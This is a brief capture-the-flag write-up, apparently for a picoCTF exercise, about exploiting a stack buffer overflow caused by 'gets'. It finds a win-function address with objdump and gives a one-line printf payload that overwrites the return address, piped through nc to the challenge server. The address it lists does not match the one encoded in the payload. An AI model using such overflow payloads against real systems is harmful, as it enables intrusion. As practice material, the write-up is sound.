- Vuln function reads 32 bytes but uses unsafe `gets` so we overflow
    `08049281`

# Writeup
- Find function address `objdump -D ./vuln | grep win`
- Exploit `printf
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08\n' | nc
    saturn.picoctf.net 58906`
